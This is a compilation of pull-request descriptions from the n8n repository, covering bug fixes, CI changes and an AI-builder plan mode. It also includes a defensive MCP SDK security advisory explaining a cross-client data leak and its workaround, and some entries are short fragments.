- **Documentation**: Complete agent specifications with input/output formats and constraints

The workflow enables teams to systematically transform feature ideas into detailed specifications with implementation plans through iterative refinement cycles.

### Key Components Added

1. **System Prompts** (`.claude/system-prompts/spec-workflow-starter.md`)
   - Main orchestration logic for the complete spec workflow
   - Workflow state machine and phase transitions
   - Agent coordination rules and tree-based evaluation for parallel execution
   - Constraint definitions for workflow execution

2. **Agent Definitions** (`.claude/agents/kfc/`)
   - `spec-requirements.md`: EARS format requirements document creation and refinement
   - `spec-design.md`: Architecture and design document generation
   - `spec-tasks.md`: Implementation task planning and decomposition
   - `spec-judge.md`: Multi-document evaluation and selection
   - `spec-impl.md`: Code implementation task execution
   - `spec-test.md`: Test case and test code generation
   - `spec-system-prompt-loader.md`: Prompt path resolution utility

3. **Configuration** (`.claude/settings/kfc-settings.json`)
   - Path definitions for specs, steering, and settings
   - View visibility configuration

### Workflow Phases

1. **Requirements Gathering**: Create EARS-formatted requirements with user story and acceptance criteria
2. **Design Document**: Develop architecture, components, data models, and business processes
3. **Task Planning**: Generate actionable implementation tasks with dependencies
4. **Implementation**: Execute tasks with code generation and testing
5. **Evaluation**: Judge and select best outputs from parallel agent execution

### Features

- **Iterative refinement**: Each phase requires explicit user approval before proceeding
- **Parallel execution**: Support for multiple agents working on the same phase (1-128 agents)
- **Tree-based evaluation**: Efficient selection from parallel outputs using hierarchical judging
- **Comprehensive constraints**: Detailed rules for each agent to ensure quality and consistency
- **Language support**: Configurable language preference throughout the workflow

## Summary

Fixes a bug where `restoreBinaryDataId` attempted to rename the same temporary binary data file once per node in the workflow. When binary data from a webhook flows through multiple nodes (e.g., Webhook → Set → Respond), each node holds a reference to the same underlying `temp/binary_data/<uuid>` file. The first rename succeeds, but subsequent renames fail with `ENOENT` because the file has already been moved.

## Problem

In `restore-binary-data-id.ts`, the code iterates over all nodes in `runData` and calls `BinaryDataService.rename()` for each node that has a binary data ID containing `/temp/`. When the same binary file is referenced by multiple nodes, this causes redundant rename attempts that fail after the first one moves the file.

Users see the following warning in logs:

```
Failed to restore binary data ID - No such file or dir
```

## Fix

Group binary data references by `fileId` using a Map before performing renames. Each unique file is renamed exactly once, and then all node references pointing to that file are updated to the corrected binary data ID.

## Tests

- Added `toIRunMultiNode` helper to construct test run data with multiple nodes
- Added test verifying that `rename` is called exactly once when 3 nodes share the same binary data ID, and all node references are updated correctly

Closes #25065

## Summary

Fixes a race condition in `FileSystemManager.rename()` where the entire shared `temp` directory was unconditionally deleted after renaming a single binary data file. When concurrent webhook executions for the same workflow wrote binary data to the same `temp` directory, one execution's cleanup could delete files still being written by another, causing `ENOENT` errors.

## Problem

In filesystem binary storage mode, webhook binary data is initially stored under a shared `temp` execution path (`workflows/{wfId}/executions/temp/binary_data/`). After execution completes, `restoreBinaryDataId` calls `FileSystemManager.rename()` to move files from `temp` to the real execution ID path. The `rename()` method then called `fs.rm(tempDir, { recursive: true })` which deleted the **entire** temp directory — including files belonging to other concurrent webhook executions.

The race condition:

1. Execution A writes binary data to `temp/binary_data/{uuid-a}`
2. Execution B writes binary data to `temp/binary_data/{uuid-b}` (concurrent)
3. Execution A completes → `rename()` moves `uuid-a` → **deletes entire `temp/` directory**
4. Execution B tries to write to `temp/binary_data/` → **ENOENT** (directory gone)

## Fix

Replace `fs.rm(tempDir, { recursive: true })` with `fs.rmdir()` (non-recursive), which only succeeds when the directory is already empty. This is safe for concurrent executions because:

- If another execution still has files in the temp directory, `rmdir` fails with `ENOTEMPTY` (silently caught)
- No TOCTOU race because `rmdir` is atomic at the filesystem level
- Empty directories are still cleaned up properly

## Tests

- Updated existing rename test to verify `rmdir` is used instead of `rm`
- Added new test verifying that `ENOTEMPTY` errors during cleanup are silently handled (concurrent execution scenario)

Closes #25066

title: ci: Configure Sentry sourcemaps for releases
body:
## Summary

Sentry sourcemaps have never worked for the frontend because `RELEASE` never reached Vite during the release build. The `@sentry/vite-plugin` and `sourcemap: !!release` are both gated on `process.env.RELEASE`, but Turbo wasn't passing it through to child processes (`globalEnv`), and `SENTRY_AUTH_TOKEN` wasn't available during the build step for the plugin to authenticate uploads.

### Root cause

1. **`RELEASE` not in Turbo's `globalEnv`** — Turbo stripped it from child processes, so Vite never saw it. Also meant cached dev builds (no sourcemaps) could be served during release builds.
2. **`SENTRY_AUTH_TOKEN` not available during build** — Only injected into the `create-sentry-release` job, not the `publish-to-npm` build step where the Vite plugin runs.
3. **Redundant frontend upload** — The `getsentry/action-release` frontend step uploaded from a separate checkout without Debug IDs, while the deployed code also had no Debug IDs — so Sentry couldn't match either way.

### Changes

| Change | Why |
|--------|-----|
| Added `RELEASE` to `turbo.json` `globalEnv` | Turbo passes it to Vite AND caches release builds separately (sourcemaps + minification produce different output) |
| Added `SENTRY_AUTH_TOKEN` to `turbo.json` `globalPassThroughEnv` | Token reaches the Vite plugin without busting the cache (doesn't affect build output, only the upload side-effect) |
| Added `SENTRY_AUTH_TOKEN` to `publish-to-npm` build step env | `@sentry/vite-plugin` can now authenticate, inject Debug IDs, and upload sourcemaps during the build |
| Removed frontend `getsentry/action-release` step | Redundant — the Vite plugin handles frontend with Debug IDs (Sentry's recommended approach) |
| Bumped `getsentry/action-release` v1.7.0 → v3.5.0 | `version` param deprecated in v3 (now `release`), adds `environment` and `inject` params |
| Added `inject: false` for backend/task-runner | The action runs on a separate checkout from the deployed build — injecting Debug IDs here would mismatch with deployed code |
| Added `strip_common_prefix: true` | Removes CI runner paths from uploaded sourcemaps so file paths match runtime stack traces |
| Added `environment: production` | Enables environment filtering in Sentry |
| Added `fetch-depth: 0` on checkout | Allows associating commits with the Sentry release |

### Note on secrets

`SENTRY_AUTH_TOKEN` is a repo-level secret (not environment-scoped), so it's accessible from the `publish-to-npm` job which runs with `environment: npm`.

title: fix(EmbeddingsOpenAi Node): Fix Dimensions and Encoding Format options not appearing in embedding ndoes
body:
## Summary

Fixes the "Dimensions" option (and "Encoding Format") not appearing when selected from the "Add Option" dropdown in the Embeddings OpenAI and Embeddings Azure OpenAI nodes.

**Root cause:** Both fields were defined with `default: undefined` inside a `collection` parameter. When the user selects an option, the UI calls `deepCopy(option.default)` which yields `undefined`, and then `NodeSettings.vue` filters out `undefined` values during parameter persistence (`nodeParameters[key] !== undefined`). 

This means the key is never saved to the node's parameters, so `Object.keys(props.values)` in the collection component never includes the field... the dropdown closes but nothing renders.

**Fix:** Replace `default: undefined` with concrete default values:
- **Dimensions**: `default: 1536` (native output dimension of `text-embedding-3-small`)
- **Encoding Format**: `default: 'float'` (standard OpenAI default)

title: fix (DateTime Node) : Handle timezone conversion when parsing dates with fromFormat
body:
## Summary
Fixes incorrect timezone conversion when parsing dates using fromFormat in parseDate.

Previously, dates parsed with DateTime.fromFormat were converted to the target timezone, unintentionally changing the clock time (e.g. 15:00 → 20:30). This resulted in double / unintended timezone shifts , which **failed EXTRACT PART from DateTime**.

This PR preserves the original local time for fromFormat inputs by applying setZone(..., { keepLocalTime: true }), while keeping existing behavior unchanged for timestamps and ISO strings.

## How to test
1. Run the unit test:
``` bash 
 pnpm test packages/nodes-base/nodes/DateTime/test/node/DateTime.extract.test.ts
```
2. Parse an ISO string or timestamp and verify timezone conversion still occurs as expected.
Existing DateTime tests continue to pass.
3. (optional) Parse a date using DateTime node to Extract Hour using fromFormat with a timezone (e.g. 3:00 PM, America/New_York) and verify the clock time remains 3:00 PM.

title: fix(ai-builder): Improve plan mode defaults and   modification awareness (no-changelog)
body:
## Summary

Improves plan mode in the AI workflow builder with four changes:

### Frontend: Default mode based on canvas state
- When the plan mode experiment is enabled, the builder defaults to **plan** mode on an empty canvas and **build** mode when nodes already exist.
- Uses a reactive watcher on `workflowId` + `nodes.length` to handle the timing of workflow loading (nodes are populated after the workflow ID is set).
- Session history no longer overrides the mode — it's determined purely by canvas state.

### Backend: Skip supervisor in plan mode
- When `mode === 'plan'` and no plan exists yet, the `check_state` routing bypasses the supervisor and goes directly to the discovery subgraph (which contains the planner).
- Previously, the supervisor had no knowledge of plan mode and would route simple modifications (e.g., "change model to X") straight to the builder, skipping plan generation entirely.

### Backend: Modification-aware plans
- Added a `<modification_mode>` section to the planner prompt: when an existing workflow is present, the planner now generates a plan describing only the **changes**, not the entire workflow.
- The builder context now includes the existing workflow as a Mermaid diagram alongside the plan, with an instruction to not recreate existing nodes.

### Backend: Mermaid workflow overview in planner/builder context
- Replaced the bare node list (`- NodeName (nodeType)`) in the planner context with a full Mermaid diagram via `mermaidStringify`, showing connections, parameters, and flow.
- Injected the same overview into the builder context when implementing a plan on an existing workflow, eliminating the need for an extra `get_workflow_overview` tool call.

Fix a regression causing Mistral Chat Model executions to fail with `Failed to parse URL from [object Request]`.

title: feat(ai-builder): Planning mode
body:
## Summary Adds **Plan Mode** to the AI Workflow Builder — an optional step where the LLM generates a structured plan for user approval before building the workflow. This gives users visibility into what will be built and the ability to steer the output before any nodes are created. Behind the `073_builder_plan_mode` PostHog experiment flag. ### How it works Plan mode adds two HITL (human-in-the-loop) interrupt points to the existing multi-agent graph, both inside the Discovery subgraph. LangGraph's `interrupt()` pauses execution and sends a payload to the frontend; `Command.resume()` continues it with the user's response. **Interrupt 1 — Clarifying questions.** The discovery agent can call a `submit_questions` tool when it needs more information. This interrupts execution and presents a questionnaire UI. The user's answers are formatted back into the discovery agent's conversation, and it continues its node search loop. **Interrupt 2 — Plan approval.** After discovery completes, the planner agent generates a `PlanOutput` (summary, trigger, steps with suggested nodes) and interrupts for a user decision. The user can approve, modify (with feedback), or reject the plan. On approval, the plan is passed to the builder subgraph as structured context in its system prompt. The builder then generates the workflow following the plan. ### Graph architecture #### Parent graph (core flow, simplified) ```mermaid graph LR supervisor -->|initial route| D[Discovery] D --> route{route_next_phase} route -->|plan approved| B[Builder] route -->|need plan / modify| D B --> route route -->|done / reject| R[Responder] ``` `route_next_phase` is deterministic — it reads the coordination log and plan state to decide the next step: | Condition | Routes to | |-----------|-----------| | `mode=plan`, no plan yet | Discovery (triggers planner) | | `planDecision=approve` | Builder (with `planOutput` in state) | | `planDecision=modify` | Discovery (re-run with feedback) | | `planDecision=reject` | Responder (end turn) | | Normal build flow | Builder or Responder per coordination log | #### Discovery subgraph ```mermaid graph LR A[Discovery Agent] -->|tool calls| T[Tools] T --> A A -->|submit result| F[Format Output] F -->|plan mode| P[Planner] F -->|build mode| OUT[END] P -->|modify| A P -->|approve/reject| OUT ``` Discovery loops between agent and tools (search nodes, get docs). When the agent calls `submit_result`, `format_output` prepares the output. In plan mode, the planner runs next and can loop back to discovery on modify. #### Plan mode flow (questions + plan + approve) ```mermaid sequenceDiagram participant User participant Frontend participant Graph participant Discovery participant Planner participant Builder User->>Frontend: "Build an email digest workflow" (plan mode) Frontend->>Graph: message + mode=plan Graph->>Discovery: Route to discovery Discovery->>Discovery: Search nodes, get docs Note over Discovery: Discovery decides it needs
more info from user Discovery->>Frontend: interrupt({type: questions, ...}) Frontend->>User: Show questionnaire UI User->>Frontend: Submit answers Frontend->>Graph: Command.resume(answers) Graph->>Discovery: Resume with answers Discovery->>Discovery: Continue with answers in context Discovery->>Planner: format_output → shouldPlan → planner Planner->>Frontend: interrupt({type: plan, plan}) Frontend->>User: Show plan with Implement button User->>Frontend: Click "Implement the plan" Frontend->>Graph: Command.resume({action: approve}) Graph->>Builder: planOutput in state, mode=build Builder->>Builder: Generate workflow from plan Builder->>Frontend: workflow-updated ``` #### Build mode flow (questions without planning) ```mermaid sequenceDiagram participant User participant Frontend participant Graph participant Discovery participant Builder User->>Frontend: "Build an email digest workflow" (build mode) Frontend->>Graph: message + mode=build Graph->>Discovery: Route to discovery Discovery->>Discovery: Search nodes, get docs Note over Discovery: Discovery decides it needs
more info from user Discovery->>Frontend: interrupt({type: questions, ...}) Frontend->>User: Show questionnaire UI User->>Frontend: Submit answers Frontend->>Graph: Command.resume(answers) Graph->>Discovery: Resume with answers Discovery->>Discovery: Continue node search Discovery->>Graph: format_output → shouldPlan → END (no plan in build mode) Graph->>Builder: Route to builder Builder->>Builder: Generate workflow directly Builder->>Frontend: workflow-updated ``` ### Key decisions **Planner lives inside the discovery subgraph**, not as a separate top-level subgraph. This avoids duplicating state threading and keeps the questions → plan flow as a natural extension of discovery. **Questions interrupt works in both modes.** The `submit_questions` tool is available regardless of plan/build mode. The only difference is whether the planner runs after discovery completes (`shouldPlan` checks `mode === 'plan'`). **Plan modify loops back to discovery**, not just to the planner. This lets the agent re-search nodes if the user's feedback requires different capabilities. Capped at 5 iterations. **Session replay stores HITL history entries** (`questions_answered`, `plan_decided`) so interrupted conversations can be fully restored when reloading a session. **Restore version link is deferred** until after streaming confirms a workflow modification actually happened. During planning/question phases, no nodes change, so the restore link isn't shown. ### Frontend changes - **PlanModeSelector** — dropdown toggle between Build and Plan modes - **PlanQuestionsMessage** — multi-step wizard for answering clarifying questions - **PlanDisplayMessage** — renders the plan with an "Implement the plan" button - **UserAnswersMessage** — displays submitted answers in chat history - Builder store manages interrupt state via `isInterrupted` / `hasPendingPlan` computed properties - Chat input stays enabled during plan review (users can type to modify the plan) - Chat input is disabled during questions (must answer via the UI) ### Telemetry - `user_switched_builder_mode` — when user toggles Plan/Build - `user_clicked_implement_plan` — when user approves a plan - `mode` field added to "User submitted builder message" and "End of response from builder" - `plan_approved` field on "End of response from builder" when a plan was executed ### Tests - Unit tests for planner agent, submit_questions tool, stream processor interrupt handling - Integration tests for plan mode discovery flow (questions → plan → approve/modify cycles) - Frontend component tests for PlanQuestionsMessage, PlanDisplayMessage, UserAnswersMessage - Builder store tests for interrupt state management, revertVersion behavior, telemetry ## Related Linear tickets, Github issues, and Community forum posts ## Review / Merge checklist - [ ] PR title and summary are descriptive. ([conventions](../blob/master/.github/pull_request_title_conventions.md)) - [ ] [Docs updated](https://github.com/n8n-io/n8n-docs) or follow-up ticket created. - [ ] Tests included. - [ ] PR Labeled with `release/backport` (if the PR is an urgent fix that needs to be backported)

## Summary

This PR adds comprehensive documentation for the n8n codebase architecture, entry points, module dependencies, and technology stack. These documents provide developers with a clear understanding of how n8n is structured, how different components interact, and how to navigate the monorepo.

### Documentation Added

1. **architecture.md** - High-level architecture overview including:
   - System architecture diagram showing all layers (Frontend, API, Business Logic, Execution, Nodes, Data, Scaling)
   - Monorepo package structure and relationships
   - Detailed package descriptions with sizes
   - Execution architecture with sequence diagrams
   - Data flow and scaling architecture
   - Key architectural patterns and principles

2. **entry_points.md** - Complete guide to n8n entry points:
   - Overview of 5 main CLI commands (start, worker, webhook, execute, execute-batch)
   - Detailed startup flow for main server with code examples
   - Worker mode architecture for queue-based processing
   - Webhook-only mode for distributed deployments
   - Direct execution modes (single and batch)
   - Main request flows (API, Webhook, Manual execution)
   - Sequence diagrams for each flow

3. **module_dependency.md** - Dependency graph and patterns:
   - Complete dependency hierarchy across all packages
   - Layer-by-layer dependency breakdown
   - Correct and incorrect import patterns
   - Circular dependency prevention strategies
   - Build order and Turbo orchestration

4. **tech_stack.md** - Comprehensive technology overview:
   - Backend stack (Node.js, Express, TypeORM, Bull, Redis)

   - Queue and scaling infrastructure

- **Tables and matrices** for quick reference

- **Best practices** and anti-patterns documented

title: fix(Google Sheets): Handle stale data race condition in Update operation
body:
## Summary
This PR fixes a race condition in the Google Sheets Update operation where rows created earlier in the same workflow execution (e.g., via an "Append" node) were not being found, causing the update to fail/empty or be skipped.

## The Issue:
 When a workflow appends a row and immediately attempts to update it in a subsequent node, the Update operation often reads stale column data that does not yet include the new row. Consequently, the node concludes that the row does not exist and returns an empty update set.

## The Fix: 
- Modified prepareDataForUpdateOrUpsert in GoogleSheet.ts. The logic now checks for this specific edge case:
- If valid inputData is provided but zero matches are found (i.e., updateData is empty), it assumes the cached column data might be stale.
- It triggers a fresh fetch of the column values (getColumnValues).
- It retries the matching logic **ONCE** with the fresh data.


## How to Test:
- Create a workflow with a Google Sheets: Append node that adds a new row (e.g., id: 123, status: new).
- Immediately follow it with a Google Sheets: Update node that tries to update that same row (match on id: 123, set status: processed).
- Without this fix, the Update node often outputs nothing or fails to update because it doesn't "see" row 123 yet.
- With this fix, the Update node successfully finds the row and updates it.

#### [CVE-2026-25536](https://redirect.github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-345p-7cg4-v4c7)

### Summary

Cross-client data leak via two distinct issues: (1) reusing a single `StreamableHTTPServerTransport` across multiple client requests, and (2) reusing a single `McpServer`/`Server` instance across multiple transports. Both are most common in stateless deployments.

### Impact

This advisory covers two related but distinct vulnerabilities. A deployment may be affected by one or both.

#### Issue 1: Transport re-use

**What happens:** When a single `StreamableHTTPServerTransport` instance handles multiple client requests, JSON-RPC message ID collisions cause responses to be routed to the wrong client's HTTP connection. The transport maintains an internal `requestId → stream` mapping, and since MCP client SDKs generate message IDs using an incrementing counter starting at 0, two clients produce identical IDs. The second client's request overwrites the first client's mapping entry, routing the response to the wrong HTTP stream.

**What is affected:** All request types — `tools/call`, `resources/read`, `prompts/get`, etc. No server-initiated features are required to trigger this.

**Conditions:**
- A single `StreamableHTTPServerTransport` instance is reused across multiple client requests (most common in stateless mode without `sessionIdGenerator`)
- Two or more clients send requests concurrently
- Clients generate overlapping JSON-RPC message IDs (the SDK's default client uses an incrementing counter starting at 0)

#### Issue 2: Server/Protocol re-use

**What happens:** When a single `McpServer` (or `Server`) instance is `connect()`ed to multiple transports (one per client), the Protocol's internal `this._transport` reference is silently overwritten. The final response to a request is routed correctly (the Protocol captures the transport reference at request time), but any **server-to-client messages sent during request handling** use the shared `this._transport` reference, which may point to a different client's transport.

**What is affected:** This depends on what features your server uses:

  - **Final responses** (the return value from a tool/resource/prompt handler): Affected in most cases. The Protocol captures this._transport at [request-handling time](https://redirect.github.com/modelcontextprotocol/typescript-sdk/blob/main/packages/core/src/shared/protocol.ts#L760), not the transport that delivered the request. This means:
    - If a request is already in-flight when a second connect() occurs (i.e., the request
   arrived before the transport was overwritten), the captured reference is correct and
  the response routes properly.
    - If a request arrives on the old transport after a second connect() has overwritten
  this._transport, the captured reference points to the new transport, and the response
  is mis-routed. The requesting client will time out.
- **Progress notifications** sent during tool execution via `sendNotification`: **Affected.** These are dispatched through `this._transport`. When the transport has been overwritten and message IDs collide on the new transport, notifications are routed to the wrong client's HTTP stream.
- **Sampling** (`createMessage`) and **elicitation** requests sent during tool execution via `sendRequest`: **Affected.** Same mechanism — the request is sent to the wrong client.
- **Spontaneous server-initiated notifications** (outside any request handler): **Affected.** These are sent to whichever client's transport was most recently connected.

**Conditions:**
- A single `McpServer`/`Server` instance is `connect()`ed to multiple transports across requests or sessions
- Two or more clients connect concurrently
- For in-request notifications/requests: message ID collision on the other transport is required for silent data leaking (the SDK's default client uses an incrementing counter starting at 0). Without collision, the transport will throw an error rather than misroute.
- For spontaneous notifications: no collision needed, messages are always sent to the last-connected client's transport

#### How to tell if you're affected

- **You use `sessionIdGenerator` (stateful mode) with a new `McpServer` per session** → not affected by either issue. Each session has its own transport and server instance.

- **You are in stateless mode and reuse both a transport and a server across requests** → affected by both issues; all request types can leak.
- **You are in stateless mode and create a new transport per request, but reuse the server** → affected by Issue 2 only; safe if your tools only return results without sending progress notifications, sampling, or elicitation during execution.
- **You create a new server + transport per request** → not affected.
- **Single-client environments** (e.g., local development with one IDE) → not affected.

### Patches

The fix (v1.26.0) adds runtime guards that turn silent data misrouting into immediate, actionable errors:

1. `Protocol.connect()` now throws if the protocol is already connected to a transport, preventing silent transport overwriting (addresses Issue 2)
2. Stateless `StreamableHTTPServerTransport.handleRequest()` now throws if called more than once, enforcing one-request-per-transport in stateless mode (addresses Issue 1)
3. In-flight request handler abort controllers are cleaned up on `close()`, and `sendNotification`/`sendRequest` in handler extras check the abort signal before sending, preventing messages from leaking after a transport is replaced

Servers that were incorrectly reusing instances will now receive a clear error message directing them to create separate instances per connection.

### Workarounds

If you cannot upgrade immediately, ensure your server creates fresh `McpServer` and transport instances for each request (stateless) or session (stateful):

```typescript
// Stateless mode: create new server + transport per request
app.post('/mcp', async (req, res) => {
  const server = new McpServer({ name: 'my-server', version: '1.0.0' });
  // ... register tools, resources, etc.
  const transport = new StreamableHTTPServerTransport({ sessionIdGenerator: undefined });
  await server.connect(transport);
  await transport.handleRequest(req, res);
});

// Stateful mode: create new server + transport per session
const sessions = new Map();
app.post('/mcp', async (req, res) => {
  const sessionId = req.headers['mcp-session-id'];
  if (sessions.has(sessionId)) {
    await sessions.get(sessionId).transport.handleRequest(req, res);
  } else {
    const server = new McpServer({ name: 'my-server', version: '1.0.0' });
    // ... register tools, resources, etc.
    const transport = new StreamableHTTPServerTransport({
      sessionIdGenerator: () => randomUUID()
    });
    await server.connect(transport);
    sessions.set(transport.sessionId, { server, transport });
    await transport.handleRequest(req, res);
  }
});
```

title: Fixed callerPolicy auto-injection blocks MCP workflow execution
body:
## Summary

Fixes a bug where callerPolicy auto-injection blocked MCP execution for webhook-only workflows, and adds cache invalidation so workflow updates are reflected immediately without restarting n8n.

Problem
In n8n 2.4.6, workflows with availableInMCP: true could not be executed via MCP because:
callerPolicy: workflowsFromSameOwner was auto-injected on every workflow save, even for webhook-only workflows that don't have an Execute Workflow Trigger node
The MCP server cached workflow metadata and didn't pick up changes until n8n was restarted
callerPolicy is intended for subworkflow security but was applied to all workflows regardless of trigger type

Solution
Frontend Changes:
Modified WorkflowSettings.vue to only set callerPolicy default when the workflow has an Execute Workflow Trigger node
Prevents auto-injection for webhook-only workflows that are meant for MCP execution

Backend Changes:
Updated removeDefaultValues() in workflow-helpers.ts to remove callerPolicy when it's the default value and the workflow doesn't have an Execute Workflow Trigger node

Modified SubworkflowPolicyChecker to skip policy checks when parentWorkflowId is undefined (e.g., MCP executions, manual runs, direct webhook calls)

Extended McpEventRelay to listen for workflow-saved events and invalidate MCP workflow cache keys, ensuring fresh data is fetched on the next MCP tool call

Testing:
Added unit tests for removeDefaultValues to verify callerPolicy handling
Added tests for SubworkflowPolicyChecker to verify MCP executions bypass policy checks
Added frontend tests to verify callerPolicy is not auto-injected for webhook-only workflows
Added integration tests to verify workflow updates remove callerPolicy for non-subworkflow workflows
Added regression tests to verify MCP execution works after workflow updates without restart

Testing
Create a new workflow with only a Webhook trigger (no Execute Workflow Trigger)
Enable "Available in MCP" in workflow settings
Save and activate the workflow
Execute the workflow via MCP — should succeed
Update the workflow settings (e.g., change timezone)
Execute via MCP again — should use fresh data without restart

The fix ensures that:
callerPolicy is only applied to workflows that can be called by other workflows (subworkflows)
MCP executions work for webhook-only workflows without callerPolicy blocking
Workflow updates are immediately reflected in MCP without requiring a restart
Existing subworkflow security is maintained

title: fixed [MCP Client] Transport selection dropdown ignored
body:
## Summary

This PR fixes a critical bug in the MCP Client Tool node where the transport selection dropdown value was not being properly persisted or read, causing the node to default to SSE transport even when HTTP Streamable was selected. This resulted in catastrophic retry loops when connecting to MCP servers that only support HTTP Streamable transport.

### Root Cause

The issue occurred when the `serverTransport` parameter was missing or undefined in the node configuration. The code did not provide a proper fallback value based on the node version, causing it to fall through to the SSE transport branch in the connection logic. This happened because:

1. When the dropdown selection wasn't properly persisted, `getNodeParameter('serverTransport')` would return `undefined`
2. The code would then fail the `=== 'httpStreamable'` check and fall through to the SSE transport code
3. This resulted in GET requests with SSE headers instead of POST requests required for HTTP Streamable

### Changes Made

1. **Added version-based fallback logic** in `getNodeConfig()` function:
   - Version 1.1 nodes default to `'sse'` transport
   - Version 1.2+ nodes default to `'httpStreamable'` transport
   - Uses `getNodeParameter` with explicit fallback value to ensure a valid transport is always selected

2. **Added transport validation** in `connectMcpClient()` function:
   - Validates that the transport value is either `'sse'` or `'httpStreamable'` before attempting connection
   - Returns a clear error message if an invalid transport value is provided

3. **Added debug logging** to help diagnose transport selection issues:
   - Logs when fallback values are used due to missing parameters
   - Helps identify when the UI selection isn't being persisted properly

4. **Applied consistent fixes** across all MCP-related nodes:
   - Fixed `McpClientTool.node.ts` (main node implementation)
   - Fixed `loadOptions.ts` (for loading tool options)
   - Fixed `McpClient.node.ts` (standalone MCP Client node)
   - Fixed `listSearch.ts` and `resourceMapping.ts` (MCP Client helper functions)

5. **Added comprehensive test coverage**:
   - Tests for explicit transport selection (both httpStreamable and sse)
   - Tests for fallback behavior when parameter is missing (version-specific)
   - Tests for invalid transport value validation
   - Tests covering all execution paths (execute, supplyData, loadOptions)
   - Tests verifying correct transport class instantiation

### Testing

To test this fix:

1. **Test explicit transport selection**:
   - Create a workflow with MCP Client Tool node (version 1.2)
   - Set the Server Transport dropdown to "HTTP Streamable"
   - Configure an endpoint URL pointing to an HTTP Streamable-only MCP server
   - Execute the workflow and verify POST requests are sent (not GET requests with SSE headers)

2. **Test fallback behavior**:
   - Create a workflow with MCP Client Tool node (version 1.2)
   - Leave Server Transport parameter unset or remove it from node parameters
   - The node should automatically use HTTP Streamable transport (the default for version 1.2+)
   - Verify the connection succeeds with POST requests

3. **Test version-specific defaults**:
   - Version 1.1 nodes should default to SSE transport when parameter is missing
   - Version 1.2+ nodes should default to HTTP Streamable transport when parameter is missing

4. **Test invalid values**:
   - Attempt to set an invalid transport value (should be caught by validation)
   - Verify a clear error message is returned

5. **Monitor server logs**:
   - Verify that the correct HTTP method (POST for HTTP Streamable, GET for SSE) is used
   - Verify that retry loops no longer occur when using HTTP Streamable transport

The fix ensures that even if the dropdown selection doesn't persist properly in the UI, the node will use the correct transport based on the node version, preventing the catastrophic retry loops described in the issue.

This PR addresses the critical bug reported in https://github.com/n8n-io/n8n/issues/24967 where the MCP Client Tool's transport selection dropdown was being ignored, causing 95+ million failed requests over 8 days due to incorrect transport selection.

 ## Summary

Fixes a race condition in the IMAP Email Trigger that could cause duplicate
workflow executions in queue / multi-worker setups.

ensuring that only one worker can claim and process a given email UID.

title: fix(HTTP Request Node): Fix pagination with generic credential types
body:
## Human View

### Summary

Fixes Bearer Authentication (and other generic credential types) not working with HTTP Request Node pagination.

**Root Cause:** The pagination code path was inconsistent with the non-pagination path for generic credential types. Without pagination, generic credentials (Bearer, Header, Query, Basic, Digest, Custom) use `this.helpers.request()` directly since auth data is already manually applied to `requestOptions`. With pagination, the code was passing the `genericCredentialType` (e.g. `httpBearerAuth`) to `requestWithAuthenticationPaginated`, which adds an unnecessary credential resolution layer that can fail silently.

**Fix:** Only pass `credentialType` to `requestWithAuthenticationPaginated` for credential types that genuinely need `requestWithAuthentication`:
- **Predefined credential types** (e.g. `googleApi`) — need token refresh/resolution
- **OAuth1/OAuth2** — need token handling

For generic types (bearer, header, query, basic, digest, custom), `credentialType` is now `undefined`, so the pagination loop uses `this.helpers.request()` directly — matching the non-pagination behavior.
